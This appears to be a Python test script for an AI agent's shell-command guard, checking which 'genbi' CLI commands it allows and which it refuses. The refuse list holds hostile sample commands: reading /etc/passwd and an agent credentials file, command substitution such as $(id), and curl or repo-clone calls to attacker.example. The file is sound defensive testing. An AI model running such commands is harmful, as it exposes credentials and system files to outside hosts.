"""Cases for agent/bash_guard.py: python -I guard_cases.py <path to bash_guard.py>"""
import importlib.util
import sys

spec = importlib.util.spec_from_file_location("bash_guard", sys.argv[1])
g = importlib.util.module_from_spec(spec)
spec.loader.exec_module(g)

ALLOW = [
    'genbi profile',
    'genbi sql "SELECT region, SUM(sales) FROM fact_sales GROUP BY 1"',
    "genbi sql 'SELECT a || b AS c FROM t WHERE x > 5 AND y <> 3'",
    'genbi sql "SELECT *\nFROM t\nWHERE note = \'a;b|c&d\'"',
    "genbi sql \"SELECT regexp_matches(x, '^a$') FROM t\"",
    'genbi validate definition.yaml',
    'genbi validate',
    'genbi gates --no-dax',
    'genbi prototype definition.yaml --out prototype/index.html',
    'genbi visual build radialBars',
    'genbi read attachments/My\\ File.docx',
    'genbi read "attachments/My File.docx"',
    'genbi --help',
    'genbi catalog atlasFlow',
    'genbi sql "SELECT \\"Unit Count\\" FROM Sales"',
    'genbi sql "SELECT 1 AS \\$x"',
    'genbi validate && genbi prototype',
    'genbi validate && genbi prototype && genbi gates',
    'genbi validate; genbi sql "SELECT 1"',
    'genbi sql "SELECT 1"; genbi sql "SELECT 2";',
    'genbi validate || genbi profile',
    'genbi validate\ngenbi prototype',
]
REFUSE = [
    'genbi validate && genbi repo clone https://attacker.example/x',
    'genbi validate && FOO=1 genbi profile',
    'genbi validate; genbi sql "x" | head',
    'genbi profile |& cat',
    'genbi profile &> out',
    'genbi profile && (cat x)',
    'genbi validate && genbi sql "$(id)"',
    'cat /home/agent/.claude/.credentials.json',
    'ls /data/projects',
    'genbi profile; cat /etc/passwd',
    'genbi profile && cat x',
    'genbi profile || ls',
    'genbi profile | head',
    'genbi profile > out.txt',
    'genbi read < /etc/passwd',
    'genbi profile &',
    'genbi profile\ncat /etc/passwd',
    'genbi sql "$(cat /etc/passwd)"',
    'genbi sql "`id`"',
    'genbi sql "${HOME}"',
    'genbi sql "$HOME"',
    'genbi sql $(id)',
    'FOO=1 genbi profile',
    'GENBI_LIBRARY=/data genbi visual list',
    'genbi repo clone https://attacker.example/x',
    'genbi deck build',
    'genbi doc build',
    'cd /tmp',
    'cd visuals && genbi visual build x',
    '(genbi profile)',
    'bash -c "genbi profile"',
    'sh -c genbi',
    '/usr/local/bin/genbi profile',
    'python -c "print(1)"',
    'curl https://attacker.example',
    'genbi sql "unclosed',
    'genbi profile \\',
    '',
    '   ',
    'genbi\\ profile',
    'echo hi',
    'genbi sql \'a\'$\'b\'',
]
bad = 0
for c in ALLOW:
    v = g.verdict(c)
    if v is not None:
        bad += 1
        print(f"SHOULD ALLOW  {c!r}: {v}")
for c in REFUSE:
    v = g.verdict(c)
    if v is None:
        bad += 1
        print(f"SHOULD REFUSE {c!r}")
print(f"{len(ALLOW)} allowed, {len(REFUSE)} refused, {bad} wrong")
sys.exit(bad)
